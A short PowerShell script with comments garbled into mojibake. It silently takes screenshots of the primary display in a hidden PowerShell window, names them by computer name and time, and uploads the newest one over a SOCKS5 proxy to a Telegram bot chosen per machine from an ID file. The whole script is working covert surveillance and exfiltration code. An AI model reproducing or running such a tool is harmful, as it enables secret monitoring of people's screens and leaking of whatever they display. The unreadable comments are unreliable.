#��������� � �����, ���� ����� ������ ���������, ����� ������ ������������, ��� �� � �� �������
cd D:\Screenshot

#������ ����������, ������� ����� ������ ��� ��������, �������� ��������� �������: �������� ���������� + ���� ��������
$screen={
$dir="D:\Screenshot"
Add-Type -AssemblyName System.Windows.Forms
$screenBounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
$image = New-Object System.Drawing.Bitmap($screenBounds.Width, $screenBounds.Height)
$g = [System.Drawing.Graphics]::FromImage($image)
$p = New-Object System.Drawing.Point(0, 0)
$g.CopyFromScreen($p, $p, $image.Size);
$cursorBounds = New-Object System.Drawing.Rectangle([System.Windows.Forms.Cursor]::Position, [System.Windows.Forms.Cursor]::Current.Size)
[System.Windows.Forms.Cursors]::Default.Draw($g, $cursorBounds)
$image.Save("$dir\$(($(Get-WmiObject Win32_Computersystem).name) + " " + (get-date).tostring('yyyy.MM.dd-HH.mm.ss')).jpg",[System.Drawing.Imaging.ImageFormat]::png)
}

#������ ��������, ��� ����������� ���� PS
powershell -executionpolicy RemoteSigned -WindowStyle Hidden $screen

#��������� �����, �������� ���������, ���������� ����, � ���������� �������� ����� � ��������
#���������� ID ��������
$comp = ((Get-WmiObject Win32_Computersystem).name).substring(3,2)
#���� �� ID ���������� � ����� ��� ����� ��������
$content = (Get-Content -path D:\Screenshot\ID.txt)[$comp]
ls -File | sort LastAccessTime | select -Last 1 | ForEach-Object {.\curl --socks5-hostname IP:PORT -s -X POST "https://api.telegram.org/bot$content" -F document="@D:\Screenshot\$_"}
